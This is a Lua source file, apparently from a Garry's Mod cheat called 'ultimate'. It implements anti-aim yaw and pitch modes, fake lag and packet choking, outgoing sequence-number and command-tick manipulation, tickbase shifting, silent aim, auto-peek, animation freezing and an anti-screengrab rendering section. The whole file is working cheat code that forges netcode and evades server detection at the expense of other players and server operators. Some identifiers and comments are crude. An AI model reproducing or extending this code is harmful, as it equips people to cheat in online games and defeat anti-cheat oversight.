    // Pendulum Sway
    [8] = function( cmd )
        local ct = CurTime()
        local delta = ultimate.cfg.vars["Sin delta"]
        local ct1 = ( ct % 0.9 )
        local ct2 = ( ct % 2 )

        local x1 = ct2 * math.sin(ct1)
        local y1 = ct2 * -1 * math.cos(ct1)

        local x2 = x1 + ct1 * math.sin(ct2)
        local y2 = y1 - ct1 * math.cos(ct2)

        local sin = ultimate.SendPacket and x2 * delta or y2 * delta
        return baseyaw + sin
    end,
    // Lag Sway
    [9] = function( cmd )
        local swaySpeed = (ultimate.fakeLagTicks + 1) / 12 * math.pi
        local swayAmount = math.sin(CurTime() * swaySpeed) * 45

        return ( baseyaw - 180 ) + 55 * ultimate.SwaySide + swayAmount * ultimate.SwaySide * -1
    end,
    // Fake Jitter
    [10] = function( cmd )
        local delta = ultimate.cfg.vars["Jitter delta"]

        local a = ultimate.SendPacket and baseyaw - 178 or baseyaw - 178 + math.random( -delta, delta )
        local b = ultimate.SendPacket and baseyaw - 178 + math.random( -delta, delta ) or baseyaw - 178

        return ultimate.inverted and a or b
    end,
    // Kappa Jitter
    [11] = function( cmd )
        local delta = ultimate.cfg.vars["Jitter delta"]

        local a = ultimate.SendPacket and baseyaw - 178 or baseyaw + ( delta * ultimate.SwaySide )
        local b = ultimate.SendPacket and baseyaw + ( delta * ultimate.SwaySide ) or baseyaw - 178

        return ultimate.inverted and a or b
    end,
    // Abu Jitter
    [12] = function( cmd )
        local ctjit = math.sin( CurTime() * 30 ) * 25

        return ctjit + ( ultimate.SendPacket and baseyaw - 160 * ultimate.SwaySide or baseyaw - 160 * -ultimate.SwaySide )
    end,
    // Satanic spinner
    [13] = function( cmd )
        local side = ultimate.inverted and 1 or -1
        local satanicvalue = math.sin( CurTime() * 666 ) * 666

        return math.NormalizeAngle( ultimate.SendPacket and satanicvalue * side or satanicvalue * -side )
    end,
    // Custom aa
    [14] = function( cmd )
        return ultimate.SendPacket and baseyaw + ultimate.cfg.vars["Custom real"] or baseyaw + ultimate.cfg.vars["Custom fake"]
    end
}







do
    local pitch, yaw = 0, 0

    local pitches = {
        [1] = 89,
        [2] = -89,
        [3] = 0,
        [4] = -180,
        [5] = 180,
    }














    local mm_side = false
    local side = false
    local pitchflip = false

    local side = 1

    local function CalcPitch()
        local cfg = ultimate.cfg.vars["Pitch"]
        local x = 0

        if cfg <= 5 then return pitches[cfg] end

        if ultimate.SendPacket then
            pitchflip = not pitchflip
        end

        if cfg == 6 then
            x = pitchflip and 180 or -180
        elseif cfg == 7 then
            x = ultimate.SendPacket and 89 or -180
        elseif cfg == 8 then
            x = ultimate.cfg.vars["Custom pitch"]
        end

        return x
    end

    /*




        elseif cfg == 7 then

        elseif cfg == 8 then

        elseif cfg == 9 then
            local sin = math.sin( CurTime() ) * 89
            y = ultimate.SendPacket and baseyaw + sin or baseyaw - sin
        elseif cfg == 10 then
            local side = jopa.GetPreviousTick() % 2 == 1

            y = ultimate.SendPacket and baseyaw - 180 or baseyaw + ( side and -89 or 89 )
        elseif cfg == 11 then

        elseif cfg == 12 then
            y = baseyaw + ( ultimate.SendPacket && ultimate.cfg.vars["Custom fake"] || ultimate.cfg.vars["Custom real"] )
        end

"Backward",
        "Fake forward",
        "Sideways",
        "Half sideways",
        "Fake spin",
        "LBY",
        "Kappa",
        "Sway",
        "VDiff",
        "القضيب الطويل",
        "Lisp",
        "Custom",

if ultimate.cfg.vars["Jitter"] == 2 and ultimate.SendPacket then
            local r = math.random(-45,45)
            local lbydiff = jopa.GetTargetLBY(pLocalPlayer:EntIndex()) - jopa.GetCurrentLBY(pLocalPlayer:EntIndex())

            if y + r > jopa.GetTargetLBY(pLocalPlayer:EntIndex()) then
                y = y + math.random(-lbydiff,lbydiff)
            else
                y = y + r
            end

        elseif ultimate.cfg.vars["Jitter"] == 3 and ultimate.SendPacket then
            y = y + math.random(jopa.GetCurrentLBY(pLocalPlayer:EntIndex()),jopa.GetTargetLBY(pLocalPlayer:EntIndex()))
        end

        */

    local function micromovement(cmd)
        if !ultimate.cfg.vars["Micromovement"] then return end
        if !pLocalPlayer:Alive() then return end
        if !pLocalPlayer:IsFlagSet( FL_ONGROUND ) then return end
        if cmd:KeyDown(IN_BACK) or cmd:KeyDown(IN_FORWARD) or cmd:KeyDown(IN_MOVELEFT) or cmd:KeyDown(IN_MOVERIGHT) then return end

        cmd:SetSideMove(mm_side and -15.0 or 15.0)
        mm_side = !mm_side
    end

    local function aacheck(cmd)
        if !ultimate.cfg.vars["Anti aim"] then return false end
        if cmd:KeyDown(IN_ATTACK) then return false end
        if cmd:KeyDown(IN_USE) then return false end
        if ultimate.moveType == MOVETYPE_LADDER then return false end
        if ultimate.moveType == MOVETYPE_NOCLIP then return false end

        if ultimate.cfg.binds["Anti aim"] != 0 and not ultimate.IsKeyDown(ultimate.cfg.binds["Anti aim"]) then
            return false
        end

        return true
    end

    function ultimate.AntiAim(cmd)
        local freestandsucc, freestandsafe, freestandunsafe

        if ultimate.cfg.vars["Freestanding"] then
            freestandsucc, freestandsafe, freestandunsafe = ultimate.Freestand(cmd)
        end

        if ultimate.SendPacket then
            ultimate.SwaySide = ultimate.SwaySide * -1
        end

        baseyaw = ultimate.GetBaseYaw()
        pitch = CalcPitch()
        yaw = ultimate.CalcYaw[ultimate.cfg.vars["Yaw"] ](cmd)

        if ultimate.cfg.vars["Yaw randomisation"] then
            yaw = yaw + math.random( -0.9, 0.9 )
        end

        if freestandsucc then
            yaw = ultimate.SendPacket and freestandunsafe or freestandsafe
        end

        if aacheck(cmd) then
            local pyAngle = Angle(pitch,yaw,0)

            micromovement(cmd)

            cmd:SetViewAngles(pyAngle)
            ultimate.oldYaw = pyAngle.y
        end
    end
end

/*
    Fake lag
*/
ultimate.fakeLagTicks = 0
ultimate.fakeLagfactor = 0
ultimate.chokedTicks = 0

ultimate.peeked = false 
ultimate.peeking = false 

function ultimate.FakeLagOnPeek()
    ultimate.fakeLagTicks = 21 - ultimate.chokedTicks - 1 

    if ultimate.chokedTicks >= 20 then
        ultimate.peeked = true
		ultimate.peeking = false
		ultimate.SendPacket = true
        pLocalPlayer.simtime_updated = true
        --jopa.UpdateClientAnimation( pLocalPlayer:EntIndex() )
		return
    end
end


if ultimate.cfg.vars["Lag fix"] then
    if ultimate.cfg.vars["Backshoot"] then
        local targetTime = jopa.GetSimulationTime( ply )
        local timeOffset = jopa.GetServerTime(cmd) - targetTime

        local serverArriveTick = jopa.GetServerTime(cmd) + jopa.GetLatency(0) + jopa.GetLatency(1)
        local diff = serverArriveTick - ply.aimshots.sw_backshoot_data.simTime
        if diff < 0.2 then 
            local tick = math.floor(0.5 + (targetTime + ultimate.GetLerpTime()) / flTickInterval)
            jopa.SetCommandTick(cmd, tick)
        else
            jopa.SetTargetInterp(jopa.GetServerTime(cmd) - targetTime)

            local tick = math.floor(0.5 + jopa.GetServerTime(cmd) / flTickInterval)
            jopa.SetCommandTick(cmd, tick - 1)
        end
    else
        local simTime = jopa.GetSimulationTime(ply)
        local tick = math.floor(0.5 + (simTime + ultimate.GetLerpTime()) / flTickInterval)
        jopa.SetCommandTick(cmd, tick)
    end
end


function ultimate.WarpOnPeek()
	jopa.StartShifting( true )

	ultimate.peeked = true
	ultimate.peeking = false
end

function ultimate.CheckPeeking()
	local plys

	for extr = 1, 8 do
        plys = ultimate.GetSortedPlayers( 1, extr, 1, true ) 
		if plys then break end
	end

	if plys and !ultimate.peeking and !ultimate.peeked then
		ultimate.peeking = true
		ultimate.peeked = false
	elseif !plys then
		ultimate.peeking = false
		ultimate.peeked = false
	end

	if ultimate.peeking and !ultimate.peeked then
		if !jopa.GetIsShifting() and jopa.GetCurrentCharge() >= ultimate.cfg.vars["Shift ticks"] and ultimate.cfg.vars["Warp on peek"] then
			ultimate.WarpOnPeek()
        elseif ultimate.cfg.vars["Freeze on peek"] then
            jopa.SetOutSequenceNr( jopa.GetOutSequenceNr() + ultimate.maxFreezeTicks - 1 ) 
		//elseif ultimate.cfg.vars["Fake lag options-On peek"] then
		//	ultimate.FakeLagOnPeek()
		end
	end
end




do
    
    local function shouldlag(cmd)
        if not ultimate.cfg.vars["Fake lag"] then return false end
        if not pLocalPlayer:Alive() then return false end
        if ultimate.cfg.vars["Fakelag comp"] == 1 and jopa.GetCurrentCharge() > 0 then return false end
        if ultimate.cfg.vars["Fake lag options-Disable on ladder"] and ultimate.moveType == MOVETYPE_LADDER then return false end
        if ultimate.cfg.vars["Fake lag options-Disable in attack"] and cmd:KeyDown(IN_ATTACK) then return false end

        if ultimate.cfg.vars["Allah fly"] and not pLocalPlayer:IsFlagSet( FL_ONGROUND ) then
            return false
        end

        return true
    end

    function ultimate.FakeLag(cmd)
        local factor = math.Round(ultimate.cfg.vars["Lag limit"])

        if ultimate.cfg.vars["Fake lag options-Randomise"] then 
            factor =  math.random(ultimate.cfg.vars["Lag randomisation"],factor) 
        end

        local velocity = pLocalPlayer:GetVelocity():Length2D()
        local pertick = velocity * flTickInterval
        local adaptive_factor = math.Clamp(math.ceil(64 / pertick),1,factor)

        if ultimate.cfg.vars["Lag mode"] == 1 or ultimate.cfg.vars["Lag mode"] == 3 then
            ultimate.fakeLagfactor = factor
        elseif ultimate.cfg.vars["Lag mode"] == 2 then
            ultimate.fakeLagfactor = adaptive_factor
        end

        if ultimate.cfg.vars["Allah walk"] and pLocalPlayer:IsFlagSet( FL_ONGROUND ) and ultimate.IsKeyDown(ultimate.cfg.binds["allahwalk"]) then
            ultimate.fakeLagfactor = 21
        end


        if shouldlag(cmd) then
            ultimate.SendPacket = false

            if ultimate.fakeLagTicks <= 0 then
                ultimate.fakeLagTicks = ultimate.fakeLagfactor
                ultimate.SendPacket = true
                pLocalPlayer.simtime_updated = true
               --jopa.UpdateClientAnimation( pLocalPlayer:EntIndex() )
            else
                ultimate.fakeLagTicks = ultimate.fakeLagTicks - 1
            end

        else
            if ultimate.fakeLagfactor > 0 then ultimate.fakeLagfactor = 0 end
            ultimate.SendPacket = true
            pLocalPlayer.simtime_updated = true
            --jopa.UpdateClientAnimation( pLocalPlayer:EntIndex() )
        end
    end
end

function ultimate.ClampMovementSpeed(cmd, speed)
	local final_speed = speed;

	local squirt = math.sqrt((cmd:GetForwardMove() * cmd:GetForwardMove()) + (cmd:GetSideMove() * cmd:GetSideMove()));

	if (squirt > speed) then
		local squirt2 = math.sqrt((cmd:GetForwardMove() * cmd:GetForwardMove()) + (cmd:GetSideMove() * cmd:GetSideMove()));

		local cock1 = cmd:GetForwardMove() / squirt2;
		local cock2 = cmd:GetSideMove() / squirt2;

		local Velocity = pLocalPlayer:GetVelocity():Length2D();

		if (final_speed + 1.0 <= Velocity) then
			cmd:SetForwardMove(0)
			cmd:SetSideMove(0)
		else
			cmd:SetForwardMove(cock1 * final_speed)
			cmd:SetSideMove(cock2 * final_speed)
        end
    end
end

function ultimate.FastWalk( cmd )
    if not ultimate.cfg.vars["Ground strafer"] then return end 
    if math.abs(cmd:GetSideMove()) > 1 or math.abs(cmd:GetForwardMove()) < 1 then return end 
    if not pLocalPlayer:IsFlagSet( FL_ONGROUND ) then return end

    if ultimate.moveType == MOVETYPE_NOCLIP or ultimate.moveType == MOVETYPE_LADDER then return end

    local waterLevel = pLocalPlayer:WaterLevel()

    if waterLevel >= 2 then return end
    
	cmd:SetSideMove(cmd:CommandNumber() % 2 == 0 and -5250 or 5250)
end

function ultimate.validMoveType()
    return ultimate.moveType != MOVETYPE_LADDER and ultimate.moveType != MOVETYPE_NOCLIP and ultimate.moveType != MOVETYPE_OBSERVER 
end

function ultimate.isMoving(cmd)
    if not cmd then
        return false
    end

    return ultimate.hoppin or cmd:KeyDown(IN_MOVELEFT) or cmd:KeyDown(IN_MOVERIGHT) or cmd:KeyDown(IN_FORWARD) or cmd:KeyDown(IN_BACK) and not cmd:KeyDown(IN_JUMP)
end

function ultimate.Stop(cmd)
    if ultimate.validMoveType() and pLocalPlayer:IsFlagSet( FL_ONGROUND ) then

        local moving = ultimate.isMoving(cmd)

        if not moving then

            local vel = pLocalPlayer:GetVelocity()
            local dir = vel:Angle()
                
            dir.yaw = ultimate.SilentAngle.y - dir.yaw
                
            local newmove = dir:Forward() * vel:Length2D()
        
            cmd:SetForwardMove(0 - newmove.x)
            cmd:SetSideMove(0 - newmove.y)

        end

    end
end

// Slidewalk

function ultimate.SlideWalk( cmd )
    local ticksToStop = ultimate.fakeLagfactor





end








// Auto peak

ultimate.startedPeeking = false
ultimate.needToMoveBack = false
ultimate.startPeekPosition = Vector(0,0,0)

function ultimate.MoveTo( cmd, pos )
    local ang = ( pos - pLocalPlayer:GetPos() ):Angle().y

    cmd:SetForwardMove(1000)
    cmd:SetSideMove(0)

    cmd:AddKey(IN_SPEED)

    ultimate.MovementFix( cmd, ang )
end

function ultimate.checkAutopeak( cmd )
    if ultimate.startedPeeking and cmd:KeyDown(IN_ATTACK) then
        ultimate.needToMoveBack = true
    elseif !ultimate.startedPeeking and !cmd:KeyDown(IN_ATTACK) then
        ultimate.needToMoveBack = false
    end
end

do
    local colorA = Color( 235, 75, 75 )
    local colorB = Color( 75, 235, 75 )

    local apmat = Material( "gui/npc.png" )

    local nullangle = Angle(0,0,0)

    function ultimate.drawAutopeak()
        local col = ultimate.needToMoveBack and colorA or colorB

        cam.Start3D2D( ultimate.startPeekPosition, nullangle, 0.5 )
            cam.IgnoreZ( true )

            surface.SetDrawColor( col )
            surface.SetMaterial( apmat )
            surface.DrawTexturedRect( -32, -32, 64, 64 )

            cam.IgnoreZ( false )
        cam.End3D2D()
    end
end

function ultimate.autopeakThink()
    if ultimate.IsKeyDown(ultimate.cfg.binds["Auto peak"]) then
        if not ultimate.startedPeeking then
            ultimate.startPeekPosition = pLocalPlayer:GetPos()
        end

        ultimate.startedPeeking = true
    else
        ultimate.startedPeeking = false
    end
end








// Sequence Manipulation

ultimate.freezedTicks = 0
ultimate.maxFreezeTicks = math.Round( 1 / flTickInterval )
function ultimate.AnimationFreezer()
    if not ultimate.IsKeyDown( ultimate.cfg.binds["Animation freezer"] ) then return end

    if ultimate.freezedTicks < ultimate.maxFreezeTicks then
        jopa.SetOutSequenceNr( jopa.GetOutSequenceNr() + ultimate.maxFreezeTicks - 1 )

        ultimate.freezedTicks = ultimate.freezedTicks + 1
    else
        ultimate.freezedTicks = 0
    end
end

ultimate.seqRunning = false
function ultimate.SequenceShit(cmd)
    local enabled = ultimate.cfg.vars["Sequence manip"] and (ultimate.cfg.binds["Sequence manip"] == 0 or ultimate.IsKeyDown(ultimate.cfg.binds["Sequence manip"]))
    
    if not enabled or cmd:KeyDown(IN_ATTACK) then
        if ultimate.seqRunning then
            ultimate.seqRunning = false
        end
        return
    end

    local mode = ultimate.cfg.vars["Sequence mode"] or 1
    local amt = ultimate.cfg.vars["Sequence min random"] and math.random(ultimate.cfg.vars["Sequence min"], ultimate.cfg.vars["OutSequence"]) or ultimate.cfg.vars["OutSequence"]
    
    if mode == 1 then
        ultimate.seqRunning = true
        ultimate.SendPacket = true
        jopa.SetOutSequenceNr(jopa.GetOutSequenceNr() + amt)
    elseif mode == 2 then
        local tickrate = math.Round(1 / flTickInterval)
        local seqshift = tickrate - 3
        
        if seqshift > 0 then
            local velocity = pLocalPlayer:GetVelocity():Length2D()
            local resetInterval = (velocity > 400) and 30 or 15
            if (cmd:CommandNumber() % resetInterval == 0) then
                ultimate.seqRunning = false
            end

            if not ultimate.seqRunning then

                local jitter = math.random(-2, 2)
                jopa.SetOutSequenceNr(jopa.GetOutSequenceNr() + seqshift + jitter)
                ultimate.seqRunning = true
                jopa.SetNetChokedPackets(0)
            else
                local targetChoke = 0
                
                if velocity < 10 then
                    targetChoke = 127 
                elseif velocity < 100 then
                    targetChoke = math.random(1, 2) 
                else
                    targetChoke = 0 
                end

                jopa.SetNetChokedPackets(targetChoke)

                if velocity < 50 and (cmd:CommandNumber() % 12 == 0) then
                    jopa.SetCommandTick(cmd, cmd:TickCount() + math.random(-1, 1))
                end
            end
        else
            ultimate.seqRunning = false
        end
        ultimate.SendPacket = true
    end
end

// Handjob ( arm breaker )

function ultimate.PerformHandjob( cmd )
    local mode = ultimate.cfg.vars["Handjob mode"]
    local shouldjerk = true

    if mode == 2 then
        shouldjerk = (cmd:CommandNumber() % 12) >= 6
    elseif mode == 3 then
        shouldjerk = math.random(0, 1) == 0
    end

    jopa.SetTyping(cmd, shouldjerk)
end

// create move hook

ultimate.norf = {
    ["laserjetpack"] = true,
    ["weapon_physgun"] = true,
}

ultimate.vapecd = false
ultimate.tyaga = 0
ultimate.maxvape = ultimate.TIME_TO_TICKS(5)
ultimate.hoppin = false
local ic = false

ultimate.slams = {}

function ultimate.OnEntityCreated(ent)
    if ent:GetClass() == "npc_satchel" and ent:GetOwner() == pLocalPlayer then
        ultimate.slams[ #ultimate.slams + 1 ] = ent
    end
end





local bWasOnGround = false


function ultimate.CreateMove(cmd)
    ultimate.DoSilentAngleUpdate( cmd )

    ultimate.aimingrn = false

    //if ( jopa.GetChokedPackets() > 14 ) then jopa.SetChokedPackets( 14 ) end

    if cmd:CommandNumber() == 0 then
        return
    end

    ultimate.flServerTime = jopa.GetCurTime()

    //if jopa.GetIsShifting() then ultimate.shiftedTicks = ultimate.shiftedTicks + 1 end

    local w = pLocalPlayer:GetActiveWeapon()
    ultimate.activeWeapon       = IsValid( w ) and w or false
    ultimate.activeWeaponClass  = IsValid( w ) and w:GetClass() or false
    ultimate.moveType           = pLocalPlayer:GetMoveType()

    //if ultimate.cfg.vars["Passive recharge"] and jopa.GetCurrentCharge() < jopa.GetMaxShiftTicks() and not pLocalPlayer:Alive() then
    //    jopa.SetReloadKeyPressed( true )
    //end


    if ultimate.cfg.vars["Silent aim"] then cmd:SetViewAngles(ultimate.SilentAngle) end

    //if jopa.GetIsShifting() then
        //  jopa.AdjustTickbase()
    //    print("shifting")
    //end

    if ultimate.cfg.vars["Flashlight spam"] and input.IsKeyDown( KEY_F ) then
        cmd:SetImpulse(100)
    end

    if ultimate.cfg.vars["Auto Vape"] then
        if cmd:KeyDown( IN_ATTACK ) then
            if ultimate.tyaga >= ultimate.maxvape then
                cmd:RemoveKey( IN_ATTACK )
                ultimate.tyaga = 0
            elseif ultimate.tyaga < ultimate.maxvape then
                ultimate.tyaga = ultimate.tyaga + 1
            end
        else
            ultimate.tyaga = 0
        end
    end

    if ultimate.cfg.vars["Auto healthkit"] then
        local weapon = me:GetActiveWeapon()
        if weapon:IsValid() then
            print( weapon:GetName() )
        end
    end

    if ultimate.vapecd then
        ultimate.vapecd = false
        cmd:RemoveKey( IN_ATTACK2 )
    elseif ultimate.cfg.vars["Vape spam"] and ultimate.activeWeapon and not ultimate.vapecd and string.StartWith( ultimate.activeWeaponClass, "weapon_vape" ) then
        cmd:AddKey( IN_ATTACK2 )
        ultimate.vapecd = true
    end

    if ultimate.cfg.vars["Handjob"] then
        ultimate.PerformHandjob( cmd )
    end

    //if ultimate.cfg.vars["Fake latency"] then
    //    local amt = ultimate.cfg.vars["Max latency"]
    //    jopa.SetInSequenceNr(jopa.GetInSequenceNr() - amt)
    //end

    if ultimate.SkipCommand then
        cmd:RemoveKey( IN_ATTACK )

        ultimate.SkipCommand = !ultimate.SkipCommand
    end

    if ( pLocalPlayer:IsFlagSet( FL_ONGROUND ) ) then
		ultimate.last_ground_pos = pLocalPlayer:GetNetworkOrigin().z
	end

    if ultimate.cfg.vars["Animation freezer"] then ultimate.AnimationFreezer() end

	ultimate.SequenceShit(cmd)

    if not ultimate.seqRunning then
        ultimate.FakeLag(cmd)

        if ultimate.cfg.vars["Allah walk"] and pLocalPlayer:IsFlagSet( FL_ONGROUND ) and ultimate.IsKeyDown(ultimate.cfg.binds["allahwalk"]) then

            if ultimate.fakeLagTicks != 20 then
                ultimate.ClampMovementSpeed(cmd, 0)
            else
                ultimate.ClampMovementSpeed(cmd, pLocalPlayer:GetWalkSpeed())
            end

            //if(ultimate.fakeLagTicks <= 20) then
            //    ultimate.ClampMovementSpeed(cmd, 0)
            //    ultimate.Stop(cmd)
                //pLocalPlayer:SetPoseParameter("move_x", 0)
	            //pLocalPlayer:SetPoseParameter("move_y", 0)
            //else
             //   ultimate.ClampMovementSpeed(cmd, pLocalPlayer:GetWalkSpeed())
            //end

            --print(ultimate.fakeLagTicks,pLocalPlayer:GetVelocity():Length2D())
        end
    end

    if ultimate.cfg.vars["Fake lag options-On peek"] or ultimate.cfg.vars["Warp on peek"] or ultimate.cfg.vars["Freeze on peek"] then
        ultimate.CheckPeeking()
    end

    // Movement

    ultimate.FastWalk( cmd )

    if ultimate.cfg.vars["Sprint"] then cmd:AddKey(IN_SPEED) end

    ultimate.hoppin = false


    if ( ultimate.IsKeyDown(ultimate.cfg.binds["Adaptive CStrafe"]) and ultimate.cfg.vars["Adaptive CStrafe"] ) then
        if me:IsFlagSet( FL_ONGROUND ) then
            cmd:AddKey( IN_JUMP )
        else
            cmd:RemoveKey( IN_JUMP )
        end
        ultimate.AutoStrafe( cmd )
    end

    if ( cmd:KeyDown( IN_JUMP ) ) then

		if ( not me:IsFlagSet( FL_ONGROUND ) ) and ultimate.cfg.vars["Bhop"] then
			cmd:RemoveKey( IN_JUMP )
            ultimate.hoppin = true
		end

		ultimate.AutoStrafe( cmd )
	end

    local directionalMove = { IN_BACK, IN_MOVERIGHT, IN_MOVELEFT }
 
    if ultimate.cfg.vars["Remove keys"] then 
        for i = 1, #directionalMove do
            cmd:RemoveKey( directionalMove[ i ] )
        end
    end

	if ultimate.cfg.vars["Fast stop"] then
        ultimate.Stop(cmd)
    end

    if ultimate.cfg.vars["Water jump"] and pLocalPlayer:WaterLevel() > 1 then
        cmd:AddKey( IN_JUMP )

    elseif ultimate.cfg.vars["Jesus lag"] and ultimate.SendPacket and pLocalPlayer:WaterLevel() == 1 then
        cmd:AddKey( IN_DUCK )
    end

    if ultimate.cfg.vars["Fake duck"] and ultimate.IsKeyDown(ultimate.cfg.binds["Fake duck"]) then
        if ultimate.fakeLagTicks > (ultimate.fakeLagfactor / 2) then
            cmd:AddKey(IN_DUCK)
        else
            cmd:RemoveKey(IN_DUCK)
        end
    end

    ultimate.targetVector = false

	jopa.StartPrediction(cmd)

        local wish_yaw = ultimate.SilentAngle.y

        if ( ultimate.IsKeyDown(ultimate.cfg.binds["Circle strafe"]) and ultimate.cfg.vars["Circle strafe"] ) then
            wish_yaw = cmd:GetViewAngles().y
        end

        if ultimate.cfg.vars["Crossbow prediction"] and ultimate.activeWeaponClass == "weapon_crossbow" then
            ultimate.CrossbowPred( cmd )
        elseif ultimate.cfg.vars["Prop aimbot"] then
            ultimate.PropAim(cmd)
        else
            ultimate.Aim(cmd)
        end

        if ultimate.cfg.vars["Silent aim"] then
            ultimate.MovementFix( cmd, wish_yaw )
        end

    jopa.FinishPrediction()

    if ultimate.cfg.vars["Double tap"] and ultimate.cfg.vars["Tickbase shift"] and cmd:KeyDown( IN_ATTACK ) then
        //ultimate.shiftedTicks = 0
        jopa.StartShifting( true )
    end

    if ultimate.cfg.vars["Auto detonator"] and #ultimate.slams > 0 then
        local d = ultimate.cfg.vars["AutoD distance"]
        d = d * d

        local plys = player.GetAll()

        for jjj = 1, #plys do
            if plys[ jjj ] == pLocalPlayer then continue end

            for k, v in pairs(ultimate.slams) do
                if not IsValid(v) then ultimate.slams[k] = nil continue end

                local pos = v:GetPos()

                if pos:DistToSqr( plys[ jjj ]:GetPos() + plys[ jjj ]:GetVelocity() * ( flTickInterval * 4 ) ) < d then
                    cmd:AddKey( IN_ATTACK2 )
                    break
                end
            end
        end
    end

    if ultimate.cfg.vars["Auto peak"] then
        local ppos = ultimate.startPeekPosition
        local pposd = pLocalPlayer:GetPos():DistToSqr(ppos)

        if ultimate.needToMoveBack and pposd < 1024 then //or ultimate.IsMovementKeysDown( cmd )
            ultimate.needToMoveBack = false
        end

        if ultimate.startedPeeking then
            //if not ultimate.IsMovementKeysDown( cmd ) then
            //    ultimate.needToMoveBack = true
            //end

            if ultimate.needToMoveBack then
                ultimate.MoveTo( cmd, ppos )

                if ultimate.cfg.vars["Auto peak tp"] and ultimate.cfg.vars["Tickbase shift"] then
                    //ultimate.shiftedTicks = 0
                    jopa.StartShifting( true )
                end
            end
        end

        ultimate.checkAutopeak( cmd )
    end

    ultimate.autoReload(cmd)

    if ultimate.cfg.vars["Use spam"] then
        if cmd:KeyDown(IN_USE) then
            cmd:RemoveKey(IN_USE)
        else
            cmd:AddKey(IN_USE)
        end
    end

    if ultimate.cfg.vars["Auto GTA"] then
        local tr = pLocalPlayer:GetEyeTrace().Entity

        if IsValid( tr ) and tr:IsVehicle() then
            cmd:AddKey(IN_USE)
        end
    end

    if ultimate.cfg.vars["Ghost follower"] then
        local tar = player.GetBySteamID( ultimate.cfg.vars["GFID"] )

        if IsValid( tar ) then
            local tang = ( tar:GetPos() - pLocalPlayer:EyePos() ):Angle()

            cmd:ClearMovement()
            cmd:ClearButtons()

            cmd:SetForwardMove( 10000 )
            cmd:SetSideMove(0)

            cmd:AddKey(IN_SPEED)

            cmd:SetViewAngles( tang )
            ultimate.MovementFix( cmd, tang.y )
        end
    end

    if ultimate.cfg.vars["Air lag duck"] and ultimate.SendPacket then
        local startPosUnducked = pLocalPlayer:GetPos()
        local isDucking = bit.band(pLocalPlayer:GetFlags(), FL_DUCKING) != 0
        if isDucking then
            startPosUnducked.z = startPosUnducked.z - (72 - 36)
        end

        jopa.StartSimulation( pLocalPlayer:EntIndex() )

        local shouldduck = true

        for i = 1, 4 do
            jopa.SimulateTick()

            local simData = jopa.GetSimulationData()

            local maxs = pLocalPlayer:OBBMaxs()
            maxs.z = 72

            if isDucking then
                simData.m_vecAbsOrigin.z = simData.m_vecAbsOrigin.z - (72 - 36)
            end

            local trace = TraceHull({
                start = startPosUnducked,
                endpos = simData.m_vecAbsOrigin,
                mins = pLocalPlayer:OBBMins(),
                maxs = maxs,
                filter = pLocalPlayer,
                mask = MASK_PLAYERSOLID
            })

            if pLocalPlayer:IsOnGround() and trace.Hit then
                shouldduck = false
                break
            end
        end

        jopa.FinishSimulation()

        if shouldduck and !pLocalPlayer:IsFlagSet( FL_ONGROUND ) then
            cmd:AddKey( IN_DUCK )
        end
    end

    if ultimate.fcenabled then
        cmd:ClearMovement()
        cmd:ClearButtons()

        cmd:SetViewAngles(ultimate.fcangles)
    end

    /*if ultimate.cfg.vars["Dodge projectiles"] and jopa.GetCurrentCharge() >= jopa.GetMaxShiftTicks() and not jopa.GetIsShifting() then
        local entitys = ents.GetAll()

        for i = 1, #entitys do
            local v = entitys[ i ]

            if v:GetClass() != "crossbow_bolt" then continue end

            local mypos = pLocalPlayer:GetPos() + pLocalPlayer:GetVelocity() * flTickInterval
            local entpos = v:GetPos() + ( v:GetAngles():Forward() * 3500 ) * flTickInterval

            if mypos:DistToSqr( entpos ) > 320 then
                cmd:ClearMovement()
                cmd:ClearButtons()

                cmd:AddKey( IN_SPEED )
                cmd:SetSideMove( 10000 )
                jopa.StartShifting( true )
            end
        end
    end*/

    if ultimate.SendPacket then
        ultimate.chokedTicks = 0
    else
        ultimate.chokedTicks = ultimate.chokedTicks + 1
    end

    if not ultimate.cfg.vars["Silent aim"] then ultimate.SilentAngle = cmd:GetViewAngles() end

    jopa.SetBSendPacket( ultimate.SendPacket )

    if ultimate.cfg.vars["Lag mode"] == 3 and ultimate.SendPacket then
        jopa.SetOutSequenceNr(jopa.GetOutSequenceNr() + 8)
    end
end

/*
    Render Scene / Anti screengrab
*/
ultimate.UnSafeFrame = false
ultimate.renderTarget = GetRenderTarget( "YaPidoras" .. os.time(), screenWidth, screenHeight )

do
    local oldsky, oldskycolor, oldwallcolor = ultimate.cfg.vars["Custom sky"], ultimate.cfg.vars["Sky color"], ultimate.cfg.vars["Wall color"]
    local oldskyclr, oldwallclr = ultimate.cfg.colors["Sky color"], ultimate.cfg.colors["Wall color"]

    local worldcollerp = string.ToColor( ultimate.cfg.colors["Wall color"] )
    local worldmats = Entity( 0 ):GetMaterials()

    local origsky = GetConVar("sv_skyname"):GetString()
    local tsides = {"lf", "ft", "rt", "bk", "dn", "up"}
    local skymat = {}

    for i = 1, 6 do
        skymat[i] = Material("skybox/" .. origsky .. tsides[i])
    end

    local function setSkyboxTexture( skyname )
        for i = 1, 6 do
            local t = Material("skybox/" .. skyname .. tsides[i]):GetTexture("$basetexture")
            skymat[i]:SetTexture("$basetexture", t)
        end
    end

    local function setSkyColor( setcolor )
        local cfg = string.ToColor( ultimate.cfg.colors["Sky color"] )
        local vector = setcolor and Vector( cfg.r/255, cfg.g/255, cfg.b/255 ) or Vector( 1, 1, 1 )

        for i = 1, 6 do
            skymat[i]:SetVector( "$color", vector )
        end
    end

    local function setWallColor( setcolor )
        local cfg = string.ToColor( ultimate.cfg.colors["Wall color"] )
        worldcollerp = ultimate.ColorLerp( worldcollerp, cfg )
        local vector = setcolor and Vector( worldcollerp.r/255, worldcollerp.g/255, worldcollerp.b/255 ) or Vector( 1, 1, 1 )

        for i = 1, #worldmats do
            local value = worldmats[i]

            Material( value ):SetVector( "$color", vector )
            Material( value ):SetFloat( "$alpha", setcolor and (cfg.a / 255) or 255 )
        end
    end

    function ultimate.RenderScene()

        local newname, newcolor, newcolor2 = ultimate.cfg.vars["Custom sky"], ultimate.cfg.vars["Sky color"], ultimate.cfg.vars["Wall color"]
        local newskyclr, newwallclr = ultimate.cfg.colors["Sky color"],ultimate.cfg.colors["Wall color"]

        if newskyclr != oldskyclr or newcolor != oldskycolor then
            setSkyColor( newcolor )

            oldskyclr = newskyclr
            oldskycolor = newcolor
        end

        if newwallclr != tostring( worldcollerp ) or newcolor2 != oldwallcolor then
            setWallColor( newcolor2 )

            oldwallcolor = newcolor2
        end

        if newname != oldsky then
